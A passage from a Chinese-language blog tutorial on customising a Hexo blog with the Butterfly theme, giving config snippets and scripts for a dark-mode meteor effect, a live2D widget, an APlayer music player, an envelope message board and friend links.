= theme.<span class="property">default_top_img</span> || <span class="string">&#x27;data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(theme.<span class="property">cover</span>.<span class="property">suffix</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(theme.<span class="property">cover</span>.<span class="property">suffix</span> == <span class="number">1</span>)</span><br><span class="line">      cover = cover + (<span class="string">&quot;?&quot;</span> + <span class="title class_">Math</span>.<span class="title function_">ceil</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*<span class="number">10000</span>))</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(theme.<span class="property">cover</span>.<span class="property">suffix</span> == <span class="number">2</span>)</span><br><span class="line">      cover = cover + (<span class="string">&quot;&amp;&quot;</span> + <span class="title class_">Math</span>.<span class="title function_">ceil</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*<span class="number">10000</span>))</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> cover</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>_config.butterfly.yml</code>中找到<code>cover:</code>，并在其后插入<code>suffix: 1</code>并保存（目的是在链接后面加入后缀？spm={随机数} 0 是不使用后缀、1 是？加随机数；2 是&amp;加随机数）</p><p>三连生效</p><h4 id="深色模式流星特效">深色模式流星特效</h4><p>【参考<a href="https://blog.meta-code.top/2021/09/30/2021-7/" rel="external nofollow noreferrer">https://blog.meta-code.top/2021/09/30/2021-7/</a>】</p><p>在前文提到的<code>_config.butterfly.yml</code>中找到<code>inject</code>处，在<code>bottom:</code>后</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">bottom:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;&lt;canvas id=&quot;universe&quot;&gt;&lt;/canvas&gt;&#x27;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;&lt;script src=&quot;/js/universe.js&quot;&gt;&lt;/script&gt;&#x27;</span></span><br></pre></td></tr></table></figure><p>之后在<code>【Blogroot】/themes/butterfly/sources/js</code>目录下创建一个<code>universe.js</code>文件，也可以添加到自己的 js 文件中。该文件或相关位置编写如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">dark</span>(<span class="params"></span>)&#123;<span class="variable language_">window</span>.<span class="property">requestAnimationFrame</span>=<span class="variable language_">window</span>.<span class="property">requestAnimationFrame</span>||<span class="variable language_">window</span>.<span class="property">mozRequestAnimationFrame</span>||<span class="variable language_">window</span>.<span class="property">webkitRequestAnimationFrame</span>||<span class="variable language_">window</span>.<span class="property">msRequestAnimationFrame</span>;<span class="keyword">var</span> n,e,i,h,t=<span class="number">0.05</span>,s=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;universe&quot;</span>),o=!<span class="number">0</span>,a=<span class="string">&quot;180,184,240&quot;</span>,r=<span class="string">&quot;226,225,142&quot;</span>,d=<span class="string">&quot;226,225,224&quot;</span>,c=[];<span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;(n=<span class="variable language_">window</span>.<span class="property">innerWidth</span>),(e=<span class="variable language_">window</span>.<span class="property">innerHeight</span>),(i=<span class="number">0.216</span>*n),s.<span class="title function_">setAttribute</span>(<span class="string">&quot;width&quot;</span>,n),s.<span class="title function_">setAttribute</span>(<span class="string">&quot;height&quot;</span>,e)&#125;<span class="keyword">function</span> <span class="title function_">u</span>(<span class="params"></span>)&#123;h.<span class="title function_">clearRect</span>(<span class="number">0</span>,<span class="number">0</span>,n,e);<span class="keyword">for</span>(<span class="keyword">var</span> t=c.<span class="property">length</span>,i=<span class="number">0</span>;i&lt;t;i++)&#123;<span class="keyword">var</span> s=c[i];s.<span class="title function_">move</span>(),s.<span class="title function_">fadeIn</span>(),s.<span class="title function_">fadeOut</span>(),s.<span class="title function_">draw</span>()&#125;&#125;<span class="keyword">function</span> <span class="title function_">y</span>(<span class="params"></span>)&#123;(<span class="variable language_">this</span>.<span class="property">reset</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;(<span class="variable language_">this</span>.<span class="property">giant</span>=<span class="title function_">m</span>(<span class="number">3</span>)),(<span class="variable language_">this</span>.<span class="property">comet</span>=!<span class="variable language_">this</span>.<span class="property">giant</span>&amp;&amp;!o&amp;&amp;<span class="title function_">m</span>(<span class="number">10</span>)),(<span class="variable language_">this</span>.<span class="property">x</span>=<span class="title function_">l</span>(<span class="number">0</span>,n-<span class="number">10</span>)),(<span class="variable language_">this</span>.<span class="property">y</span>=<span class="title function_">l</span>(<span class="number">0</span>,e)),(<span class="variable language_">this</span>.<span class="property">r</span>=<span class="title function_">l</span>(<span class="number">1.1</span>,<span class="number">2.6</span>)),(<span class="variable language_">this</span>.<span class="property">dx</span>=<span class="title function_">l</span>(t,<span class="number">6</span>*t)+(<span class="variable language_">this</span>.<span class="property">comet</span>+<span class="number">1</span>-<span class="number">1</span>)*t*<span class="title function_">l</span>(<span class="number">50</span>,<span class="number">120</span>)+<span class="number">2</span>*t),(<span class="variable language_">this</span>.<span class="property">dy</span>=-<span class="title function_">l</span>(t,<span class="number">6</span>*t)-(<span class="variable language_">this</span>.<span class="property">comet</span>+<span class="number">1</span>-<span class="number">1</span>)*t*<span class="title function_">l</span>(<span class="number">50</span>,<span class="number">120</span>)),(<span class="variable language_">this</span>.<span class="property">fadingOut</span>=<span class="literal">null</span>),(<span class="variable language_">this</span>.<span class="property">fadingIn</span>=!<span class="number">0</span>),(<span class="variable language_">this</span>.<span class="property">opacity</span>=<span class="number">0</span>),(<span class="variable language_">this</span>.<span class="property">opacityTresh</span>=<span class="title function_">l</span>(<span class="number">0.2</span>,<span class="number">1</span>-<span class="number">0.4</span>*(<span class="variable language_">this</span>.<span class="property">comet</span>+<span class="number">1</span>-<span class="number">1</span>))),(<span class="variable language_">this</span>.<span class="property">do</span>=<span class="title function_">l</span>(<span class="number">5e-4</span>,<span class="number">0.002</span>)+<span class="number">0.001</span>*(<span class="variable language_">this</span>.<span class="property">comet</span>+<span class="number">1</span>-<span class="number">1</span>))&#125;),(<span class="variable language_">this</span>.<span class="property">fadeIn</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">this</span>.<span class="property">fadingIn</span>&amp;&amp;((<span class="variable language_">this</span>.<span class="property">fadingIn</span>=!(<span class="variable language_">this</span>.<span class="property">opacity</span>&gt;<span class="variable language_">this</span>.<span class="property">opacityTresh</span>)),(<span class="variable language_">this</span>.<span class="property">opacity</span>+=<span class="variable language_">this</span>.<span class="property">do</span>))&#125;),(<span class="variable language_">this</span>.<span class="property">fadeOut</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">this</span>.<span class="property">fadingOut</span>&amp;&amp;((<span class="variable language_">this</span>.<span class="property">fadingOut</span>=!(<span class="variable language_">this</span>.<span class="property">opacity</span>&lt;<span class="number">0</span>)),(<span class="variable language_">this</span>.<span class="property">opacity</span>-=<span class="variable language_">this</span>.<span class="property">do</span>*<span class="number">0.5</span>),(<span class="variable language_">this</span>.<span class="property">x</span>&gt;n||<span class="variable language_">this</span>.<span class="property">y</span>&lt;<span class="number">0</span>)&amp;&amp;((<span class="variable language_">this</span>.<span class="property">fadingOut</span>=!<span class="number">1</span>),<span class="variable language_">this</span>.<span class="title function_">reset</span>()))&#125;),(<span class="variable language_">this</span>.<span class="property">draw</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">if</span>((h.<span class="title function_">beginPath</span>(),<span class="variable language_">this</span>.<span class="property">giant</span>))(h.<span class="property">fillStyle</span>=<span class="string">&quot;rgba(&quot;</span>+a+<span class="string">&quot;,&quot;</span>+<span class="variable language_">this</span>.<span class="property">opacity</span>+<span class="string">&quot;)&quot;</span>),h.<span class="title function_">arc</span>(<span class="variable language_">this</span>.<span class="property">x</span>,<span class="variable language_">this</span>.<span class="property">y</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>*<span class="title class_">Math</span>.<span class="property">PI</span>,!<span class="number">1</span>);<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">comet</span>)&#123;(h.<span class="property">fillStyle</span>=<span class="string">&quot;rgba(&quot;</span>+d+<span class="string">&quot;,&quot;</span>+<span class="variable language_">this</span>.<span class="property">opacity</span>+<span class="string">&quot;)&quot;</span>),h.<span class="title function_">arc</span>(<span class="variable language_">this</span>.<span class="property">x</span>,<span class="variable language_">this</span>.<span class="property">y</span>,<span class="number">1.5</span>,<span class="number">0</span>,<span class="number">2</span>*<span class="title class_">Math</span>.<span class="property">PI</span>,!<span class="number">1</span>);<span class="keyword">for</span>(<span class="keyword">var</span> t=<span class="number">0</span>;t&lt;<span class="number">30</span>;t++)(h.<span class="property">fillStyle</span>=<span class="string">&quot;rgba(&quot;</span>+d+<span class="string">&quot;,&quot;</span>+(<span class="variable language_">this</span>.<span class="property">opacity</span>-(<span class="variable language_">this</span>.<span class="property">opacity</span>/<span class="number">20</span>)*t)+<span class="string">&quot;)&quot;</span>),h.<span class="title function_">rect</span>(<span class="variable language_">this</span>.<span class="property">x</span>-(<span class="variable language_">this</span>.<span class="property">dx</span>/<span class="number">4</span>)*t,<span class="variable language_">this</span>.<span class="property">y</span>-(<span class="variable language_">this</span>.<span class="property">dy</span>/<span class="number">4</span>)*t-<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,),h.<span class="title function_">fill</span>()&#125;<span class="title function_">else</span>(h.<span class="property">fillStyle</span>=<span class="string">&quot;rgba(&quot;</span>+r+<span class="string">&quot;,&quot;</span>+<span class="variable language_">this</span>.<span class="property">opacity</span>+<span class="string">&quot;)&quot;</span>),h.<span class="title function_">rect</span>(<span class="variable language_">this</span>.<span class="property">x</span>,<span class="variable language_">this</span>.<span class="property">y</span>,<span class="variable language_">this</span>.<span class="property">r</span>,<span class="variable language_">this</span>.<span class="property">r</span>);h.<span class="title function_">closePath</span>(),h.<span class="title function_">fill</span>()&#125;),(<span class="variable language_">this</span>.<span class="property">move</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;(<span class="variable language_">this</span>.<span class="property">x</span>+=<span class="variable language_">this</span>.<span class="property">dx</span>),(<span class="variable language_">this</span>.<span class="property">y</span>+=<span class="variable language_">this</span>.<span class="property">dy</span>),!<span class="number">1</span>===<span class="variable language_">this</span>.<span class="property">fadingOut</span>&amp;&amp;<span class="variable language_">this</span>.<span class="title function_">reset</span>(),(<span class="variable language_">this</span>.<span class="property">x</span>&gt;n-n/<span class="number">4</span>||<span class="variable language_">this</span>.<span class="property">y</span>&lt;<span class="number">0</span>)&amp;&amp;(<span class="variable language_">this</span>.<span class="property">fadingOut</span>=!<span class="number">0</span>)&#125;),<span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;o=!<span class="number">1</span>&#125;,<span class="number">50</span>)&#125;<span class="keyword">function</span> <span class="title function_">m</span>(<span class="params">t</span>)&#123;<span class="keyword">return</span> <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="number">1e3</span>*<span class="title class_">Math</span>.<span class="title function_">random</span>())+<span class="number">1</span>&lt;<span class="number">10</span>*t&#125;<span class="keyword">function</span> <span class="title function_">l</span>(<span class="params">t,i</span>)&#123;<span class="keyword">return</span> <span class="title class_">Math</span>.<span class="title function_">random</span>()*(i-t)+t&#125;<span class="title function_">f</span>(),<span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;resize&quot;</span>,f,!<span class="number">1</span>),(<span class="keyword">function</span>(<span class="params"></span>)&#123;h=s.<span class="title function_">getContext</span>(<span class="string">&quot;2d&quot;</span>);<span class="keyword">for</span>(<span class="keyword">var</span> t=<span class="number">0</span>;t&lt;i;t++)(c[t]=<span class="keyword">new</span> <span class="title function_">y</span>()),c[t].<span class="title function_">reset</span>();<span class="title function_">u</span>()&#125;)(),(<span class="keyword">function</span> <span class="title function_">t</span>(<span class="params"></span>)&#123;<span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;html&quot;</span>)[<span class="number">0</span>].<span class="title function_">getAttribute</span>(<span class="string">&quot;data-theme&quot;</span>)==<span class="string">&quot;dark&quot;</span>&amp;&amp;<span class="title function_">u</span>(),<span class="variable language_">window</span>.<span class="title function_">requestAnimationFrame</span>(t)&#125;)()&#125;</span><br><span class="line"><span class="title function_">dark</span>();</span><br></pre></td></tr></table></figure><p>以上段落的最后部分<code>('data-theme')=='dark'</code>一段表明其仅在主题深色模式下启用。</p><p>为修改方便，随后请在<code>【Blogroot】/themes/butterfly/sources/css</code>目录下创建一个 css 文件，名字自定，例如<code>custom.css</code>，在其中加上：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 夜间模式下背景宇宙星光 */</span></span><br><span class="line"><span class="selector-id">#universe</span> &#123;  </span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">    <span class="attribute">position</span>: fixed;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">outline</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">pointer-events</span>: none;</span><br><span class="line">    <span class="attribute">z-index</span>: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 亮色模式下隐藏 */</span></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&#x27;light&#x27;</span>]</span> <span class="selector-id">#universe</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>回到<code>_config.butterfly.yml</code>，再次找到<code>inject</code>处，在<code>head:</code>后</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">head:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/css/custom.css&quot;/&gt;</span></span><br></pre></td></tr></table></figure><p>hexo 三连，完成</p><h4 id="live2D">live2D</h4><p>在<code>【Blogroot】</code>目录下打开 Git，输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-helper-live2d #普通版 Live2D 主程序</span><br><span class="line">npm install 【模型名称】 #字面意思</span><br></pre></td></tr></table></figure><p>作者提供了以下几个模型于<a href="https://github.com/xiazeyu/live2d-widget-models" rel="external nofollow noreferrer">https://github.com/xiazeyu/live2d-widget-models</a>中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">live2d-widget-model-chitose</span><br><span class="line">live2d-widget-model-epsilon2_1</span><br><span class="line">live2d-widget-model-gf</span><br><span class="line">live2d-widget-model-haru/01 (use npm install --save live2d-widget-model-haru)</span><br><span class="line">live2d-widget-model-haru/02 (use npm install --save live2d-widget-model-haru)</span><br><span class="line">live2d-widget-model-haruto</span><br><span class="line">live2d-widget-model-hibiki</span><br><span class="line">live2d-widget-model-hijiki</span><br><span class="line">live2d-widget-model-izumi</span><br><span class="line">live2d-widget-model-koharu</span><br><span class="line">live2d-widget-model-miku</span><br><span class="line">live2d-widget-model-ni-j</span><br><span class="line">live2d-widget-model-nico</span><br><span class="line">live2d-widget-model-nietzsche</span><br><span class="line">live2d-widget-model-nipsilon</span><br><span class="line">live2d-widget-model-nito</span><br><span class="line">live2d-widget-model-shizuku</span><br><span class="line">live2d-widget-model-tororo</span><br><span class="line">live2d-widget-model-tsumiki</span><br><span class="line">live2d-widget-model-unitychan</span><br><span class="line">live2d-widget-model-wanko</span><br><span class="line">live2d-widget-model-z16</span><br></pre></td></tr></table></figure><p>回到<code>_config.yml</code>，新起一段添加</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">live2d:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment">#是否启用</span></span><br><span class="line">  <span class="attr">scriptFrom:</span> <span class="string">local</span></span><br><span class="line">  <span class="attr">model:</span> </span><br><span class="line">    <span class="attr">use:</span> <span class="string">【模型名称】</span> <span class="comment">#模型选择</span></span><br><span class="line">  <span class="attr">display:</span> </span><br><span class="line">    <span class="attr">position:</span> <span class="string">right</span> <span class="comment">#模型位置</span></span><br><span class="line">    <span class="attr">width:</span> <span class="number">120</span> <span class="comment">#模型宽度</span></span><br><span class="line">    <span class="attr">height:</span> <span class="number">240</span> <span class="comment">#模型高度</span></span><br><span class="line">    <span class="attr">hOffset:</span> <span class="number">20</span> <span class="comment">#纵向偏移</span></span><br><span class="line">    <span class="attr">vOffset:</span> <span class="number">-55</span> <span class="comment">#横向偏移</span></span><br><span class="line">  <span class="attr">mobile:</span> </span><br><span class="line">    <span class="attr">show:</span> <span class="literal">false</span> <span class="comment">#是否在手机端显示</span></span><br><span class="line">  <span class="attr">react:</span></span><br><span class="line">    <span class="attr">opacity:</span> <span class="number">0.8</span> <span class="comment">#透明度</span></span><br></pre></td></tr></table></figure><p>另有更高级版本可参考<a href="https://www.mmbkz.cn/a262193e.html" rel="external nofollow noreferrer">https://www.mmbkz.cn/a262193e.html</a>和<a href="https://diego369.github.io/2022/04/08/live2d" rel="external nofollow noreferrer">https://diego369.github.io/2022/04/08/live2d</a></p><h4 id="全局左下角-APlayer">全局左下角 APlayer</h4><p>官方教程为<a href="https://butterfly.js.org/posts/507c070f/" rel="external nofollow noreferrer">https://butterfly.js.org/posts/507c070f/</a></p><p>hexo-tag-aplayer 可使用下文方法引入并使用。</p><p>在<code>【Blogroot】</code>目录下打开 Git，安装插件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm un hexo-tag-aplayer</span><br></pre></td></tr></table></figure><p>回到<code>_config.butterfly.yml</code>，在约第 859 行 APlayer 处、第 919 行 inject 处作如下修改</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">## Inject the css and script (aplayer/meting)</span><br><span class="line">aplayerInject:</span><br><span class="line"><span class="deletion">-  enable:</span></span><br><span class="line"><span class="deletion">-  per_page:</span></span><br><span class="line"><span class="addition">+  enable: true</span></span><br><span class="line"><span class="addition">+  per_page: true</span></span><br><span class="line">......</span><br><span class="line">inject:</span><br><span class="line">  head:</span><br><span class="line">    ......</span><br><span class="line">  bottom:</span><br><span class="line">    ......</span><br><span class="line"><span class="addition">+    - &lt;div class=&quot;aplayer no-destroy&quot; data-id=&quot;【自定义】&quot; data-server=&quot;netease&quot; data-type=&quot;playlist&quot; data-fixed=&quot;true&quot; data-mini=&quot;true&quot; data-volume=&quot;0.2&quot; data-listFolded=&quot;true&quot; data-preload=&quot;none&quot; data-autoplay=&quot;false&quot; muted&gt;&lt;/div&gt;</span></span><br></pre></td></tr></table></figure><p>上方示例使用了<code>MetingJS</code>，配置大多与 MetingJS 相同，普通使用只需注意以下参数：</p><ul><li>data-id=“” ： 指定调用的 id ，一般可以在地址栏中找到</li><li>data-server=“netease” ： 网易云音乐服务器，可改为 <code>netease</code>, <code>tencent</code>, <code>kugou</code>, <code>xiami</code>, <code>baidu</code> ，分别对应<code>网易云音乐</code>、<code>QQ 音乐</code>、<code>酷狗音乐</code>、<code>虾米音乐</code>、<code>百度音乐</code></li><li>data-type=&quot;playlist ： 指定调用类型，可选 <code>song</code>, <code>playlist</code>, <code>album</code>, <code>search</code>, <code>artist</code> ，分别对应<code>单曲</code>、<code>歌单</code>、<code>专辑</code>、<code>搜索结果</code>、<code>艺术家</code></li><li>data-fixed=“true” ： 播放器吸附在页面左下角</li><li>data-mini=“true” ： 迷你版播放器</li><li>data-volume=“0.2” ： 默认音量为 0.2</li><li>autoplay=“false” ： 取消自动播放</li></ul><p>APlayer 基本配置完成，美化之类的可自行搜索。</p><h4 id="信笺样式留言板">信笺样式留言板</h4><p><a href="https://akilar.top/posts/e2d3c450/" rel="external nofollow noreferrer">https://akilar.top/posts/e2d3c450/</a></p><p>在【Blogroot】下打开 Git 运行指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-butterfly-envelope --save</span><br></pre></td></tr></table></figure><p>在站点配置文件或者主题配置文件（二选一）添加配置项</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## envelope_comment</span></span><br><span class="line"><span class="comment">## see https://akilar.top/posts/e2d3c450/</span></span><br><span class="line"><span class="attr">envelope_comment:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment">#控制开关</span></span><br><span class="line">  <span class="attr">custom_pic:</span>      </span><br><span class="line">    <span class="attr">cover:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-envelope/lib/violet.jpg</span> <span class="comment">#信笺头部图片</span></span><br><span class="line">    <span class="attr">line:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-envelope/lib/line.png</span> <span class="comment">#信笺底部图片</span></span><br><span class="line">    <span class="attr">beforeimg:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-envelope/lib/before.png</span> <span class="comment">## 信封前半部分</span></span><br><span class="line">    <span class="attr">afterimg:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-envelope/lib/after.png</span> <span class="comment">## 信封后半部分</span></span><br><span class="line">  <span class="attr">message:</span> <span class="comment">#信笺正文，多行文本，写法如下</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">有什么想问的？</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">有什么想说的？</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">有什么想吐槽的？</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">哪怕是有什么想吃的，都可以告诉我哦~</span></span><br><span class="line">  <span class="attr">bottom:</span> <span class="string">自动书记人偶竭诚为您服务！</span> <span class="comment">#仅支持单行文本</span></span><br><span class="line">  <span class="attr">height:</span> <span class="comment">#1050px，信封划出的高度</span></span><br><span class="line">  <span class="attr">path:</span> <span class="comment">#【可选】comments 的路径名称。默认为 comments，生成的页面为 comments/index.html</span></span><br><span class="line">  <span class="attr">front_matter:</span> <span class="comment">#【可选】comments 页面的 front_matter 配置</span></span><br><span class="line">    <span class="attr">title:</span> <span class="string">留言板</span></span><br><span class="line">    <span class="attr">comments:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h4 id="友情链接设置与美化">友情链接设置与美化</h4><h5 id="设置">设置</h5><p>在<code>[Blogroot]\source\</code>目录下创建文件夹（例如<code>friends</code>），然后在此目录下创建<code>index.md</code>文件。在此文件中输入以下内容（基本内容，其他你亦可自定义）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 友情链接</span><br><span class="line">type: &#x27;link&#x27;</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>然后前往<code>[Blogroot]\source\_data\</code>目录下新建<code>link.yml</code>文件（没有目录的自己创建个），按照以下格式输入：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">class_name:</span> <span class="string">分组</span> <span class="number">1</span> <span class="comment">## title</span></span><br><span class="line">  <span class="attr">class_desc:</span> <span class="comment">## 分组备注</span></span><br><span class="line">  <span class="attr">link_list:</span> <span class="comment">## 友链列表</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">名称</span></span><br><span class="line">      <span class="attr">link:</span> <span class="string">访问链接</span> <span class="string">url</span></span><br><span class="line">      <span class="attr">avatar:</span> <span class="string">图片链接（最好通过图床构建，避免加载失效）</span></span><br><span class="line">      <span class="attr">descr:</span> <span class="string">链接描述</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">名称</span></span><br><span class="line">      <span class="attr">link:</span> <span class="string">访问链接</span> <span class="string">url</span></span><br><span class="line">      <span class="attr">avatar:</span> <span class="string">图片链接</span></span><br><span class="line">      <span class="attr">descr:</span> <span class="string">链接描述</span></span><br><span class="line">    </span><br><span class="line"><span class="bullet">-</span> <span class="attr">class_name:</span> <span class="comment">## title</span></span><br><span class="line">  <span class="attr">class_desc:</span> <span class="comment">## 分组备注</span></span><br><span class="line">  <span class="attr">link_list:</span> <span class="string">分组</span> <span class="number">2</span> <span class="comment">## 友链列表</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">名称</span></span><br><span class="line">      <span class="attr">link:</span> <span class="string">访问链接</span> <span class="string">url</span></span><br><span class="line">      <span class="attr">avatar:</span> <span class="string">图片链接</span></span><br><span class="line">      <span class="attr">descr:</span> <span class="string">链接描述</span></span><br></pre></td></tr></table></figure><p><code>_config.butterfly.yml</code>前面关于导航栏的配置，想必无需多言，去除注释即可。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">友链：/friends/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-link</span> <span class="comment">## 斜杠中间那个就是相对地址，例如你前面创建单页的文件夹名为`friends`，此处便如是填写。</span></span><br></pre></td></tr></table></figure><p>Hexo 三连即可。</p><h5 id="美化">美化</h5><p><a href="https://akilar.top/posts/57291286/" rel="external nofollow noreferrer">https://akilar.top/posts/57291286/</a></p><h4 id="加载动画">加载动画</h4><h5 id="齿轮">齿轮</h5><p>参考<a href="https://cnhuazhu.top/butterfly/2021/02/25/Hexo%E9%AD%94%E6%94%B9/Hexo%E7%AB%99%E7%82%B9%E5%8A%A0%E8%BD%BD%E5%8A%A8%E7%94%BB%E4%BF%AE%E6%94%B9%EF%BC%88%E9%BD%BF%E8%BD%AE%E6%95%88%E6%9E%9C%EF%BC%89/" rel="external nofollow noreferrer">https://cnhuazhu.top/butterfly/2021/02/25/Hexo%E9%AD%94%E6%94%B9/Hexo%E7%AB%99%E7%82%B9%E5%8A%A0%E8%BD%BD%E5%8A%A8%E7%94%BB%E4%BF%AE%E6%94%B9%EF%BC%88%E9%BD%BF%E8%BD%AE%E6%95%88%E6%9E%9C%EF%BC%89/</a></p><p>（最终我没有选择此方案）</p><h5 id="胶囊样式加载进度条">胶囊样式加载进度条</h5><blockquote><p><font color="orange">虽说 Butterfly4.5.0 